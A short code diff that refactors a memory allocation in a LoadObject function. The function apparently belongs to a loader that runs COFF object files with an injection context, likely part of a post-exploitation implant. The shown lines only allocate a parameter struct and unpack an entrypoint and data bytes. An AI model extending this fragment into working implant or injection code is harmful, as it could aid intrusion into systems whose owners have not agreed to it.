@@ -413,10 +413,8 @@ namespace Objects {
 
     VOID LoadObject(_parser parser) {
 
-        _coff_params    *params = { };
         _injection_ctx  inject  = { };
-
-        params = (_coff_params*) x_malloc(sizeof(_coff_params));
+        _coff_params    *params = (_coff_params*) x_malloc(sizeof(_coff_params));
 
         params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
         params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
